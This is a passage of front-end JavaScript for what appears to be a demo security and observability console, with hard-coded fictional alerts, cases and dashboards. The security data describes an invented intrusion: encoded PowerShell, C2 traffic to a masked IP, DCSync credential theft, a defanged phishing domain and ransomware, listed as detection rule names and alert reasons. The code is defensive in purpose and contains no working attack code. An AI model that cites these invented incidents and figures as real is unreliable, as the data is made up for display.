      <div class="cs-stat"><div class="cs-stat-k">Closed cases</div><div class="cs-stat-v">${stats.closed}</div></div>
      <div class="cs-stat"><div class="cs-stat-k">Average time to close ${ic('help',12)}</div><div class="cs-stat-v">${stats.avg}</div></div>
    </div>
    <div class="cs-filters">
      <div class="cs-search">${ic('search',14)}<input placeholder="Search cases" value="${state.casesQuery||''}" oninput="App.casesSearch(this.value)"></div>
      ${fchip('Severity',4)}${fchip('Status',3)}${fchip('Assignees',0)}${fchip('Tags',11)}${fchip('Categories',5)}
      <button class="cs-fchip" onclick="App.stub('More filters')">More +</button>
    </div>
    <div class="cs-subbar">
      <span>Showing ${shown.length} of ${total} cases</span>
      <span class="cs-sep"></span>
      <button class="cs-link" onclick="App.stub('Refresh')">${ic('rotate',12)} Refresh</button>
      <span style="margin-left:auto"></span>
      <button class="cs-link" onclick="App.stub('Columns')">${ic('list',12)} Columns</button>
    </div>
    <div class="cs-scroll"><table class="cs-table">
      <thead><tr>
        <th style="width:34px"><span class="cs-cb"></span></th>
        <th>Name <span class="so">↕</span></th>
        <th>Assignees</th><th>Tags</th><th>Alerts</th><th>Comments</th>
        <th>Category <span class="so">↕</span></th>
        <th>External incident</th>
        <th>Status <span class="so">↕</span></th>
        <th>Severity <span class="so">↕</span></th>
        <th style="text-align:center">Actions</th>
      </tr></thead>
      <tbody id="recBody">${casesRowsHTML(shown)}</tbody>
    </table></div>
  </div>`;
  /* the arrival glow plays once — mark archived threads as seen */
  setTimeout(()=>{ Object.values(state.threads).forEach(t=>{ if(t.archivedAt) t._recSeen=true; }); },100);
}

/* ---- ALERTS (mode-aware) ---- */
const SEC_ALERTS=[
 {rule:'Unusual service account logon',sev:'High',entity:'FIN-WS-04 · svc-backup',count:1,seen:'02:41',icon:'user'},
 {rule:'Encoded PowerShell execution',sev:'High',entity:'FIN-WS-04',count:1,seen:'02:41',icon:'terminal'},
 {rule:'Outbound to rare external IP',sev:'High',entity:'FIN-WS-04 → 45.137.x.x',count:14,seen:'02:42',icon:'network'},
 {rule:'SMB lateral movement attempt',sev:'Medium',entity:'FIN-WS-04 → FIN-DC-01',count:1,seen:'02:44',icon:'host'},
 {rule:'Impossible travel',sev:'High',entity:'cfo@corp',count:2,seen:'09:41',icon:'user'},
 {rule:'OAuth consent to unverified app',sev:'Medium',entity:'jdoe@corp',count:1,seen:'1d',icon:'at'},
 {rule:'Brute-force authentication',sev:'Low',entity:'finance subnet',count:312,seen:'02:18',icon:'lock'},
];
const OPS_ALERTS=[
 {rule:'SLO burn: checkout p99 latency',sev:'High',entity:'checkout-service',count:1,seen:'02:14',icon:'gauge'},
 {rule:'Error-rate spike (5xx)',sev:'High',entity:'payments-api',count:1,seen:'01:50',icon:'warn'},
 {rule:'Slow query detected',sev:'Medium',entity:'carts (db)',count:1,seen:'02:16',icon:'db'},
 {rule:'Disk saturation',sev:'Medium',entity:'kafka-broker-3',count:1,seen:'6h',icon:'host'},
 {rule:'Pod restart loop',sev:'Low',entity:'ingest-worker',count:3,seen:'1d',icon:'rotate'},
 {rule:'Upstream provider degraded',sev:'Low',entity:'eu-west-1',count:1,seen:'3d',icon:'network'},
];
const ALERTS_PAGE={
  dayshift:{
    total:'12,529', field:'host.name',
    sev:[{l:'Critical',v:104,c:'var(--red)'},{l:'High',v:1240,c:'var(--amber)'},{l:'Medium',v:9765,c:'#d6a72c'},{l:'Low',v:1420,c:'var(--green)'}],
    byName:[['Unusual port for process','1,240'],['Brute-force authentication','312'],['Credential-harvest URL clicked','18'],['Outbound to rare external IP','14'],['Impossible travel','2']],
    top:[{l:'FIN-WS-04',v:'28.1%',p:100},{l:'FIN-WS-09',v:'13.9%',p:49},{l:'Sales-NAS',v:'12.5%',p:44},{l:'FIN-DB-02',v:'8.1%',p:29},{l:'FIN-WS-22',v:'6.4%',p:23}],
    rows:[
      {t:'Today @ 09:41:12.008',rule:'Impossible travel',sev:'High',risk:87,reason:'cfo@corp signed in from AS20473 minutes after Boston, MFA satisfied via existing token'},
      {t:'Today @ 09:34:51.334',rule:'Privileged group membership change',sev:'High',risk:82,reason:'svc-helpdesk added to Domain Admins outside any change ticket'},
      {t:'Today @ 09:13:07.551',rule:'Credential-harvest URL clicked',sev:'High',risk:74,reason:'18 users reached okta-login[.]co, 0 submissions confirmed'},
      {t:'Today @ 08:47:11.209',rule:'DCSync — directory replication',sev:'Critical',risk:91,reason:'FIN-WS-09 replicated krbtgt + 3 privileged accounts as svc-fin-report'},
      {t:'Today @ 02:44:02.118',rule:'SMB lateral movement attempt',sev:'Medium',risk:47,reason:'FIN-WS-04 to FIN-DC-01 over tcp/445, authentication failed'},
      {t:'Today @ 02:42:36.660',rule:'Outbound to rare external IP',sev:'High',risk:73,reason:'FIN-WS-04 to 45.137.x.x:443, 14 connections over 6 minutes'},
      {t:'Today @ 02:41:22.729',rule:'Encoded PowerShell execution',sev:'High',risk:73,reason:'powershell.exe -enc decoding to a download cradle, parent services.exe'},
      {t:'Today @ 02:41:07.913',rule:'Unusual service account logon',sev:'High',risk:79,reason:'svc-backup interactive (type 10) logon on FIN-WS-04'},
      {t:'Today @ 02:31:44.101',rule:'Mass file rename detected',sev:'Critical',risk:88,reason:'1,431 files renamed to .lkx on the Sales-NAS share from FIN-WS-22'},
    ],
  },
  nightshift:{
    total:'3,184', field:'service.name',
    sev:[{l:'Critical',v:12,c:'var(--red)'},{l:'High',v:286,c:'var(--amber)'},{l:'Medium',v:2310,c:'#d6a72c'},{l:'Low',v:576,c:'var(--green)'}],
    byName:[['SLO burn rate exceeded','1k+'],['Error-rate spike (5xx)','842'],['Latency p99 regression','503'],['Slow database query','318'],['Pod restart loop','141']],
    top:[{l:'checkout-service',v:'31.4%',p:100},{l:'payments-api',v:'22.7%',p:72},{l:'ingest-worker',v:'14.2%',p:45},{l:'cart-service',v:'9.6%',p:31},{l:'kafka-broker-3',v:'7.1%',p:23}],
    rows:[
      {t:'Today @ 02:14:51.882',rule:'SLO burn rate exceeded',sev:'High',risk:71,reason:'availability budget for checkout-service burning 14x'},
      {t:'Today @ 02:14:48.114',rule:'Latency p99 regression',sev:'High',risk:68,reason:'p99 on GetCart span rose 22ms → 360ms after deploy v2.8.1'},
      {t:'Today @ 01:50:09.430',rule:'Error-rate spike (5xx)',sev:'High',risk:66,reason:'payments-api 5xx rate climbed to 4.1% after config push'},
      {t:'Today @ 02:16:33.201',rule:'Slow database query',sev:'Medium',risk:44,reason:'full table scan on carts (1.2M rows), missing index hint'},
      {t:'Today @ 02:38:11.770',rule:'Disk saturation',sev:'Medium',risk:41,reason:'kafka-broker-3 volume at 92%, stale log segments'},
      {t:'Yesterday @ 23:41:55.018',rule:'Pod restart loop',sev:'Low',risk:28,reason:'ingest-worker restarted 3x, heap growth before OOM'},
      {t:'Yesterday @ 22:10:04.665',rule:'Upstream provider degraded',sev:'Low',risk:24,reason:'eu-west-1 latency elevated, failover available'},
    ],
  },
};
function renderAlerts(c){
  const day=state.mode==='dayshift';
  const D=ALERTS_PAGE[day?'dayshift':'nightshift'];
  const sevTotal=D.sev.reduce((s,x)=>s+x.v,0);
  let acc=0;
  const conic=D.sev.map(s=>{ const a=acc; acc+=s.v; return `${s.c} ${(a/sevTotal*100).toFixed(1)}% ${(acc/sevTotal*100).toFixed(1)}%`; }).join(',');
  const fmt=n=> n>=1000 ? (n/1000).toFixed(n>=10000?0:1).replace(/\.0$/,'')+'k+' : ''+n;
  const sevRows=D.sev.map(s=>`<tr><td><span class="al-sevdot" style="background:${s.c}"></span>${s.l}</td><td class="mono" style="text-align:right;font-weight:600">${fmt(s.v)}</td></tr>`).join('');
  const byNameRows=D.byName.map(r=>`<tr><td class="al-byname">${r[0]}</td><td class="mono" style="text-align:right;color:var(--ink-2)">${r[1]}</td></tr>`).join('');
  const topRows=D.top.map(r=>`<div class="al-toprow"><span class="al-toplabel mono">${r.l}</span><div class="al-topbar"><i style="width:${r.p}%"></i></div><span class="al-toppct">${r.v}</span></div>`).join('');
  const relS=(s)=>{ if(s<1)return 'just now'; if(s<60)return s+'s ago'; let m=Math.round(s/60); if(m<60)return m+(m===1?' min ago':' mins ago'); let h=Math.round(m/60); if(h<24)return h+(h===1?' hr ago':' hrs ago'); let d=Math.round(h/24); return d+(d===1?' day ago':' days ago'); };
  const tblRows=Array.from({length:20},(_,i)=>{ const r=D.rows[i%D.rows.length]; const sev=SEV[r.sev]||SEV.Low; const agoSec=Math.round(i*i*1.1+i*4); return `<tr>
      <td class="al-check"><span class="al-cb"></span></td>
      <td class="mono al-time" style="color:var(--ink-3);font-size:11.5px;white-space:nowrap">${relS(agoSec)}</td>
      <td><a class="al-rulelink">${r.rule}</a></td>
      <td class="al-col-assignee" style="color:var(--ink-4)">—</td>
      <td style="text-align:center"><span class="al-sevdot" title="${r.sev} severity" style="background:${sev.c};margin:0"></span></td>
      <td class="mono" style="font-weight:600">${r.risk}</td>
      <td class="al-col-reason" style="color:var(--ink-2);font-size:12px">${r.reason}</td>
    </tr>`; }).join('');
  c.innerHTML=`<div class="page-pad alerts-page">
    <div class="pg-head" style="margin:-18px -20px 14px"><h2 class="pg-title">${day?'Security alerts':'Observability alerts'}</h2></div>
    <button class="al-filterbtn" onclick="App.toggleAlertFilters()">${ic('filter',14)} Filters <span class="al-fbadge">1</span> <span class="al-fx">${ic('chevron',12)}</span></button>
    <div class="al-filters${state.alertsFiltersOpen?' open':''}">
      <div class="al-filter"><span class="al-fl">Status</span><span class="al-fv">open</span><span class="al-fbadge">1</span><span class="al-fx">${ic('chevron',12)}</span></div>
      <div class="al-filter grow"><span class="al-fl">Severity</span><span class="al-fph">Any</span><span class="al-fx">${ic('chevron',12)}</span></div>
      <div class="al-filter grow"><span class="al-fl">${day?'User':'Service'}</span><span class="al-fph">Any</span><span class="al-fx">${ic('chevron',12)}</span></div>
      <div class="al-filter grow"><span class="al-fl">${day?'Host':'Cluster'}</span><span class="al-fph">Any</span><span class="al-fx">${ic('chevron',12)}</span></div>
      <button class="al-fmore" title="More filters">${ic('dots',16)}</button>
    </div>
    <button class="al-vizbtn" onclick="App.toggleAlertSummary()">${ic('gauge',14)} ${state.alertsSummaryOpen?'Hide':'Show'} summary <span class="al-fx">${ic('chevron',12)}</span></button>
    <div class="al-summary${state.alertsSummaryOpen?' open':''}">
      <div class="al-tabs">
        <button class="al-tab on">Summary</button>
        <button class="al-tab">Trend</button>
        <button class="al-tab">Counts</button>
        <button class="al-tab">Treemap</button>
      </div>
      <div class="al-cards">
        <div class="al-card">
          <div class="al-card-h">Severity levels</div>
          <div class="al-sevwrap">
            <table class="al-sevtable"><thead><tr><th>Levels</th><th style="text-align:right">Count</th></tr></thead><tbody>${sevRows}</tbody></table>
            <div class="al-donut" style="background:conic-gradient(${conic})"><div class="al-donuthole"><b>${D.total}</b><span>alerts</span></div></div>
          </div>
        </div>
        <div class="al-card">
          <div class="al-card-h">Alerts by name</div>
          <table class="al-nametable"><thead><tr><th>Rule name</th><th style="text-align:right">Count ${ic('chevron',10)}</th></tr></thead><tbody>${byNameRows}</tbody></table>
        </div>
        <div class="al-card">
          <div class="al-card-h">Top alerts by <span class="al-fieldpill">${D.field} ${ic('chevron',11)}</span></div>
          <div class="al-fieldlabel">${D.field}</div>
          <div class="al-toplist">${topRows}</div>
        </div>
      </div>
    </div>
    <div class="al-toolbar">
      <div class="al-tb-top">
        <div class="al-tb-count"><b>${D.total}</b><span>alerts</span></div>
        <button class="al-chip al-chip-view">${ic('grid',13)}<span>Grid view</span>${ic('chevron',11)}</button>
      </div>
      <div class="al-tb-controls">
        <button class="al-chip">Columns<span class="al-tbadge">18</span></button>
        <button class="al-chip">${ic('list',13)}<span>Sort</span><span class="al-tbadge">1</span></button>
        <span class="al-tb-div"></span>
        <button class="al-chip">${ic('filter',13)}<span>Additional filters</span>${ic('chevron',11)}</button>
        <button class="al-chip">Group by: None${ic('chevron',11)}</button>
      </div>
    </div>
    <div class="al-tablewrap">
      <table class="gtable al-table"><thead><tr><th class="al-check"></th><th>@timestamp ${ic('arrow',10)}</th><th>Rule</th><th class="al-col-assignee">Assignees</th><th style="text-align:center">Severity</th><th>Risk Score</th><th class="al-col-reason">Reason</th></tr></thead>
      <tbody>${tblRows}</tbody></table>
    </div>
  </div>`;
}

/* ---- ENTITIES (mode-aware) ---- */
const SEC_ENT=[
 {e:'FIN-WS-04',t:'host',risk:91,sig:'17 alerts · C2 · lateral movement'},
 {e:'svc-backup',t:'identity',risk:88,sig:'anomalous logon · stale credential'},
 {e:'45.137.x.x',t:'ip',risk:75,sig:'rare external · C2 destination'},
 {e:'cfo@corp',t:'identity',risk:67,sig:'impossible travel'},
 {e:'FIN-DC-01',t:'host',risk:42,sig:'targeted by SMB pivot'},
 {e:'jdoe@corp',t:'identity',risk:35,sig:'OAuth consent grant'},
];
const OPS_ENT=[
 {e:'checkout-service',t:'service',risk:84,sig:'SLO burn · p99 +340ms'},
 {e:'payments-api',t:'service',risk:61,sig:'5xx error-rate spike'},
 {e:'carts',t:'datastore',risk:58,sig:'full table scan · 1.2M rows'},
 {e:'kafka-broker-3',t:'host',risk:30,sig:'disk recovered'},
 {e:'ingest-worker',t:'service',risk:22,sig:'heap stable post-fix'},
];
function riskTone(r){ return r>=80?'var(--red)':r>=50?'var(--amber)':'var(--green)'; }
function renderEntities(c){
  const day=state.mode==='dayshift'; const E=day?SEC_ENT:OPS_ENT; let rows='';
  E.forEach(x=>{ rows+=`<div class="ent-row"><div class="ent-risk" style="background:${riskTone(x.risk)}">${x.risk}</div><div class="ent-b"><div class="ent-n">${x.e}</div><div class="ent-meta">${x.sig}</div></div><span class="ent-type">${x.t}</span></div>`; });
  c.innerHTML=`<div class="simple-app"><div class="pg-head" style="margin:0 0 14px"><h2 class="pg-title">${day?'Entity risk':'Service health'}</h2></div><div class="sa-scroll">${rows}</div></div>`;
}

/* ---- DASHBOARDS (mode-aware) ---- */
/* ---- DASHBOARDS PAGE: navigator-style left menu + selected dashboard ---- */
function dashSpark(pts,col){ const w=240,h=56,mx=Math.max(...pts),mn=Math.min(...pts),dx=w/(pts.length-1); const py=v=>h-4-((v-mn)/((mx-mn)||1))*(h-10); let d='M0 '+py(pts[0]).toFixed(0); pts.forEach((v,i)=>{ if(i) d+=' L'+(i*dx).toFixed(0)+' '+py(v).toFixed(0); }); return `<svg class="spark" viewBox="0 0 ${w} ${h}" preserveAspectRatio="none"><path d="${d}" fill="none" stroke="${col}" stroke-width="2" stroke-linejoin="round" vector-effect="non-scaling-stroke"/></svg>`; }
function dashBars(bars){ const bmax=Math.max(...bars.map(b=>b.v))||1; return `<div class="bars-row">`+bars.map(b=>`<div class="bcol"><div class="bk" style="height:${Math.max(6,b.v/bmax*70)}px;background:${b.c}"></div><div class="bl">${b.l} ${b.v}</div></div>`).join('')+`</div>`; }
function dashList(rows){ return `<div style="display:flex;flex-direction:column;gap:9px">`+rows.map(r=>`<div style="display:flex;align-items:center;gap:10px;font-size:12px"><span style="flex:0 0 150px;color:var(--ink-1);font-family:var(--mono);font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${r.l}</span><span style="flex:1;height:7px;background:var(--bg-2);border-radius:4px;overflow:hidden"><i style="display:block;height:100%;width:${r.p}%;background:${r.c||'var(--blue)'};border-radius:4px"></i></span><span style="flex:0 0 auto;color:var(--ink-0);font-weight:600;font-size:11.5px;min-width:42px;text-align:right">${r.v}</span></div>`).join('')+`</div>`; }
function dashKpi(items){ return `<div style="display:flex;gap:22px">`+items.map(i=>`<div><div style="font-size:22px;font-weight:700;color:${i.c||'var(--ink-0)'};line-height:1">${i.v}</div><div style="font-size:11px;color:var(--ink-3);margin-top:4px">${i.k}</div></div>`).join('')+`</div>`; }
function dashTable(headers,rows){ return `<table class="gtable"><thead><tr>${headers.map(h=>`<th>${h}</th>`).join('')}</tr></thead><tbody>${rows.map(r=>`<tr>${r.map((c,i)=>`<td${i===0?'':' class="mono"'}>${c}</td>`).join('')}</tr>`).join('')}</tbody></table>`; }
const PINNED_DASH={dayshift:['overview','detresp'],nightshift:['svc','checkout']};
const DASHBOARDS={
  dayshift:[
    {id:'overview',name:'Overview',icon:'gauge',sub:'Detections, alerts & events',tiles:()=>`
      <div class="tile"><div class="tile-h">Total alerts · 24h</div><div class="tile-big">1,284</div><div class="tile-sub">▲ 12% vs prior day</div></div>
      <div class="tile"><div class="tile-h">Open alerts</div><div class="tile-big" style="color:var(--amber)">86</div><div class="tile-sub">21 unassigned</div></div>
      <div class="tile wide"><div class="tile-h">Alert trend · last 24h (stack by rule)</div>${dashSpark([20,28,24,30,42,120,180,140,90,60,48,40],'var(--blue)')}</div>
      <div class="tile"><div class="tile-h">Alerts by severity</div><div class="donut" style="background:conic-gradient(var(--red) 0 14%,var(--amber) 14% 42%,var(--blue) 42% 78%,var(--ink-4) 78% 100%)"><div class="hole">1.2k</div></div><div class="legend"><span><i style="background:var(--red)"></i>Critical</span><span><i style="background:var(--amber)"></i>High</span><span><i style="background:var(--blue)"></i>Medium</span><span><i style="background:var(--ink-4)"></i>Low</span></div></div>
      <div class="tile"><div class="tile-h">Events by category · 24h</div>${dashBars([{l:'auth',v:41,c:'var(--blue)'},{l:'process',v:33,c:'var(--violet)'},{l:'network',v:21,c:'var(--teal)'},{l:'file',v:14,c:'var(--ink-4)'}])}</div>
      <div class="tile wide"><div class="tile-h">Top alerting rules</div>${dashList([{l:'Unusual port for process',v:'1,240',p:100,c:'var(--amber)'},{l:'Brute-force authentication',v:312,p:25,c:'var(--red)'},{l:'Credential-harvest URL clicked',v:18,p:6,c:'var(--amber)'},{l:'Outbound to rare IP',v:14,p:5,c:'var(--red)'},{l:'Encoded PowerShell',v:5,p:3,c:'var(--blue)'}])}</div>`},
    {id:'detresp',name:'Detection & Response',icon:'shield',sub:'Alerts, cases, hosts & users',tiles:()=>`
      <div class="tile"><div class="tile-h">Open alerts</div><div class="tile-big" style="color:var(--red-d)">86</div><div class="tile-sub">12 critical · 31 high</div></div>
      <div class="tile"><div class="tile-h">Open cases</div><div class="tile-big">23</div><div class="tile-sub">3 in progress</div></div>
      <div class="tile"><div class="tile-h">Cases by status</div><div class="donut" style="background:conic-gradient(var(--blue) 0 40%,var(--amber) 40% 66%,var(--green) 66% 100%)"><div class="hole">28</div></div><div class="legend"><span><i style="background:var(--blue)"></i>Open</span><span><i style="background:var(--amber)"></i>In progress</span><span><i style="background:var(--green)"></i>Closed</span></div></div>
      <div class="tile wide"><div class="tile-h">Open alerts by rule</div>${dashList([{l:'Unusual port for process',v:38,p:100,c:'var(--amber)'},{l:'Credential-harvest URL clicked',v:18,p:47,c:'var(--amber)'},{l:'Outbound to rare IP',v:14,p:37,c:'var(--red)'},{l:'External mail-forwarding rule',v:3,p:8,c:'var(--red)'}])}</div>
      <div class="tile"><div class="tile-h">Hosts with most alerts</div>${dashTable(['Host','Alerts'],[['FIN-WS-04','17'],['FIN-WS-09','4'],['FIN-WS-22','2'],['FIN-DB-02','2']])}</div>
      <div class="tile"><div class="tile-h">Users with most alerts</div>${dashTable(['User','Alerts'],[['svc-backup','17'],['svc-fin-report','4'],['cfo@corp','3'],['j.reyes','2']])}</div>`},
    {id:'rulemon',name:'Rule monitoring',icon:'pulse',sub:'Rule health & performance',tiles:()=>`
      <div class="tile"><div class="tile-h">Rules enabled</div><div class="tile-big">296</div><div class="tile-sub">of 940 prebuilt</div></div>
      <div class="tile"><div class="tile-h">Executions · 24h</div><div class="tile-big">48.2k</div><div class="tile-sub up">99.4% succeeded</div></div>
      <div class="tile"><div class="tile-h">Response status</div><div class="donut" style="background:conic-gradient(var(--green) 0 94%,var(--amber) 94% 98%,var(--red) 98% 100%)"><div class="hole">99%</div></div><div class="legend"><span><i style="background:var(--green)"></i>Succeeded</span><span><i style="background:var(--amber)"></i>Warning</span><span><i style="background:var(--red)"></i>Failed</span></div></div>
      <div class="tile wide"><div class="tile-h">Rule gap histogram · last 24h</div>${dashBars([{l:'00',v:0,c:'var(--ink-4)'},{l:'04',v:1,c:'var(--amber)'},{l:'08',v:0,c:'var(--ink-4)'},{l:'12',v:2,c:'var(--amber)'},{l:'16',v:0,c:'var(--ink-4)'},{l:'20',v:1,c:'var(--amber)'}])}</div>
      <div class="tile wide"><div class="tile-h">Top slowest rules (avg run)</div>${dashList([{l:'Threat intel · indicator match',v:'4.2s',p:100,c:'var(--amber)'},{l:'ML · rare process by host',v:'2.8s',p:67,c:'var(--blue)'},{l:'Sequence · lateral movement',v:'2.1s',p:50,c:'var(--blue)'},{l:'EQL · credential access',v:'1.4s',p:33,c:'var(--blue)'}])}</div>
      <div class="tile"><div class="tile-h">Rules with failures</div><div class="tile-big" style="color:var(--red-d)">3</div><div class="tile-sub">indicator-match timeouts</div></div>`},
    {id:'edr',name:'Endpoint Detection & Response',icon:'host',sub:'Elastic Defend',tiles:()=>`
      <div class="tile"><div class="tile-h">Detections</div><div class="tile-big">3,820</div><div class="tile-sub">last 24 hours</div></div>
      <div class="tile"><div class="tile-h">Preventions</div><div class="tile-big" style="color:var(--green)">0</div><div class="tile-sub">blocked at endpoint</div></div>
      <div class="tile"><div class="tile-h">Ransomware</div><div class="tile-big" style="color:var(--red-d)">1</div><div class="tile-sub">INC-2042 · Sales-NAS — active</div></div>
      <div class="tile"><div class="tile-h">Open alerts by OS</div><div class="donut" style="background:conic-gradient(var(--blue) 0 18%,var(--violet) 18% 94%,var(--teal) 94% 100%)"><div class="hole">3.8k</div></div><div class="legend"><span><i style="background:var(--blue)"></i>Windows</span><span><i style="background:var(--violet)"></i>Linux</span><span><i style="background:var(--teal)"></i>macOS</span></div></div>
      <div class="tile wide"><div class="tile-h">Open alerts over time · last 24h</div>${dashSpark([120,135,110,150,130,160,125,155,140,158,130,150,145,135,150,120,140,30,4,1],'var(--teal)')}</div>
      <div class="tile wide"><div class="tile-h">Open alerts by severity</div>
        <div style="display:flex;align-items:center;gap:32px">
          <div class="donut" style="background:conic-gradient(var(--red) 0 2.8%,var(--amber) 2.8% 17.3%,var(--blue) 17.3% 82.2%,var(--ink-4) 82.2% 100%)"><div class="hole">3.8k</div></div>
          <div style="display:flex;gap:14px;flex:1;flex-wrap:wrap">
            ${[['Critical',108,'var(--red)'],['High',552,'var(--amber)'],['Medium',2480,'var(--blue)'],['Low',680,'var(--ink-4)']].map(s=>`<div style="flex:1;min-width:90px"><div style="display:flex;align-items:center;gap:6px;font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:.04em;color:var(--ink-3)"><i style="width:9px;height:9px;border-radius:2px;background:${s[2]}"></i>${s[0]}</div><div style="font-size:26px;font-weight:700;color:var(--ink-0);letter-spacing:-.02em;margin-top:6px">${s[1].toLocaleString()}</div></div>`).join('')}
          </div>
        </div></div>
      <div class="tile wide"><div class="tile-h">Open alerts by top 10 MITRE technique</div>
        ${[['Command and Scripting Interpreter',1120,100],['Masquerading',690,62],['Application Layer Protocol',410,37],['OS Credential Dumping',380,34],['Boot or Logon Initialization Scripts',320,29],['Steal Web Session Cookie',280,25],['Exploitation for Credential Access',250,22],['Hide Artifacts',205,18],['Indicator Removal',180,16],['Data Manipulation',150,13]].map(r=>`<div style="display:flex;align-items:center;gap:12px;margin-bottom:9px"><span style="flex:0 0 232px;color:var(--ink-1);font-size:11.5px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${r[0]}</span><span style="flex:1;height:8px;background:var(--bg-2);border-radius:4px;overflow:hidden"><i style="display:block;height:100%;width:${r[2]}%;background:var(--teal);border-radius:4px"></i></span><span style="flex:0 0 auto;color:var(--ink-0);font-weight:600;font-size:11.5px;min-width:48px;text-align:right">${r[1].toLocaleString()}</span></div>`).join('')}</div>
      <div class="tile"><div class="tile-h">Top 10 infected endpoints</div>${dashTable(['Endpoint','Open alerts'],[['edge-sec-windows-11-ts-obtc-estec-0','689'],['edge-sec-debian-11-obtc-estec-0','469'],['edge-sec-ubuntu-2204-obtc-estec-0','446'],['edge-sec-ubuntu-2004-obtc-estec-0','444'],['edge-sec-debian-12-obtc-estec-0','430'],['edge-sec-rhel-8-obtc-estec-0','368'],['edge-sec-centos-stream-9-obtc-estec-0','356']])}</div>
      <div class="tile"><div class="tile-h">Top 10 impacted users per endpoint</div>${dashTable(['Endpoint › User','Open alerts'],[['edge-sec-windows-11-ts-obtc-estec-0 › SYSTEM','689'],['edge-sec-debian-11-obtc-estec-0 › root','469'],['edge-sec-ubuntu-2204-obtc-estec-0 › root','446'],['edge-sec-ubuntu-2004-obtc-estec-0 › root','444'],['edge-sec-debian-12-obtc-estec-0 › root','430'],['edge-sec-rhel-8-obtc-estec-0 › root','368'],['edge-sec-centos-stream-9-obtc-estec-0 › root','356']])}</div>`},
    {id:'entity',name:'Entity analytics',icon:'entities',sub:'Risk scores & anomalies',tiles:()=>`
      <div class="tile"><div class="tile-h">Critical-risk entities</div><div class="tile-big" style="color:var(--red-d)">4</div><div class="tile-sub">score ≥ 80</div></div>
      <div class="tile"><div class="tile-h">Anomalies · 24h</div><div class="tile-big">28</div><div class="tile-sub">across 9 ML jobs</div></div>
      <div class="tile wide"><div class="tile-h">Top host risk scores</div>${dashList([{l:'FIN-WS-04',v:91,p:91,c:'var(--red)'},{l:'FIN-WS-09',v:84,p:84,c:'var(--red)'},{l:'FIN-DC-01',v:42,p:42,c:'var(--amber)'},{l:'HR-WS-14',v:28,p:28,c:'var(--blue)'}])}</div>
      <div class="tile wide"><div class="tile-h">Top user risk scores</div>${dashList([{l:'svc-backup',v:88,p:88,c:'var(--red)'},{l:'svc-fin-report',v:81,p:81,c:'var(--red)'},{l:'cfo@corp',v:67,p:67,c:'var(--amber)'},{l:'j.reyes',v:53,p:53,c:'var(--amber)'}])}</div>
      <div class="tile"><div class="tile-h">Risk distribution</div><div class="donut" style="background:conic-gradient(var(--red) 0 8%,var(--amber) 8% 26%,var(--blue) 26% 60%,var(--ink-4) 60% 100%)"><div class="hole">418</div></div><div class="legend"><span><i style="background:var(--red)"></i>Critical</span><span><i style="background:var(--amber)"></i>High</span><span><i style="background:var(--blue)"></i>Mod</span><span><i style="background:var(--ink-4)"></i>Low</span></div></div>
      <div class="tile"><div class="tile-h">Notable anomalies</div>${dashKpi([{v:'14',k:'rare process'},{v:'9',k:'unusual logon'},{v:'5',k:'data egress'}])}</div>`},
    {id:'hosts',name:'Hosts',icon:'asset',sub:'Host security events',tiles:()=>`
      <div class="tile"><div class="tile-h">Hosts</div><div class="tile-big">1,130</div><div class="tile-sub">42 with events · 24h</div></div>
      <div class="tile"><div class="tile-h">Unique IPs</div><div class="tile-big">3,408</div><div class="tile-sub">source + destination</div></div>
      <div class="tile wide"><div class="tile-h">Host events · last 24h</div>${dashSpark([120,140,130,150,180,420,520,380,260,200,160,140],'var(--blue)')}</div>
      <div class="tile wide"><div class="tile-h">Top event actions</div>${dashList([{l:'process_creation',v:'18.2k',p:100,c:'var(--violet)'},{l:'network_flow',v:'11.4k',p:63,c:'var(--teal)'},{l:'file',v:'6.1k',p:34,c:'var(--blue)'},{l:'authentication',v:'2.4k',p:13,c:'var(--ink-4)'}])}</div>
      <div class="tile"><div class="tile-h">Platforms</div><div class="donut" style="background:conic-gradient(var(--blue) 0 64%,var(--teal) 64% 82%,var(--violet) 82% 100%)"><div class="hole">1.1k</div></div><div class="legend"><span><i style="background:var(--blue)"></i>Windows</span><span><i style="background:var(--teal)"></i>macOS</span><span><i style="background:var(--violet)"></i>Linux</span></div></div>
      <div class="tile"><div class="tile-h">Top hosts</div>${dashTable(['Host','Events'],[['FIN-WS-04','4.2k'],['WEB-03','2.1k'],['BKP-02','1.8k'],['FIN-DC-01','1.1k']])}</div>`},
    {id:'network',name:'Network',icon:'network',sub:'Flows, DNS & TLS',tiles:()=>`
      <div class="tile"><div class="tile-h">Flows · 24h</div><div class="tile-big">2.41M</div><div class="tile-sub">inbound + outbound</div></div>
      <div class="tile"><div class="tile-h">DNS queries</div><div class="tile-big">486k</div><div class="tile-sub">428 unique domains</div></div>
      <div class="tile wide"><div class="tile-h">Egress volume · last 24h (GB)</div>${dashSpark([18,20,19,22,24,40,58,44,30,24,20,19],'var(--teal)')}</div>
      <div class="tile wide"><div class="tile-h">Top destination IPs</div>${dashList([{l:'45.137.x.x',v:'14',p:100,c:'var(--red)'},{l:'104.18.x.x · CDN',v:'9.2k',p:70,c:'var(--ink-4)'},{l:'140.82.x.x · GitHub',v:'4.1k',p:40,c:'var(--ink-4)'},{l:'8.8.8.8 · DNS',v:'2.0k',p:20,c:'var(--ink-4)'}])}</div>
      <div class="tile"><div class="tile-h">Top source countries</div>${dashBars([{l:'US',v:64,c:'var(--blue)'},{l:'DE',v:14,c:'var(--blue)'},{l:'NG',v:6,c:'var(--amber)'},{l:'RU',v:3,c:'var(--red)'}])}</div>
      <div class="tile"><div class="tile-h">TLS / plaintext</div><div class="donut" style="background:conic-gradient(var(--green) 0 92%,var(--amber) 92% 100%)"><div class="hole">92%</div></div><div class="legend"><span><i style="background:var(--green)"></i>TLS</span><span><i style="background:var(--amber)"></i>Plaintext</span></div></div>`},
    {id:'users',name:'Users',icon:'user',sub:'Authentication & behavior',tiles:()=>`
      <div class="tile"><div class="tile-h">Successful logons</div><div class="tile-big">9,840</div><div class="tile-sub">last 24 hours</div></div>
      <div class="tile"><div class="tile-h">Failed logons</div><div class="tile-big" style="color:var(--amber)">312</div><div class="tile-sub">finance subnet spike</div></div>
      <div class="tile wide"><div class="tile-h">Authentication · last 24h</div>${dashSpark([220,240,210,260,300,180,90,140,260,320,300,280],'var(--blue)')}</div>
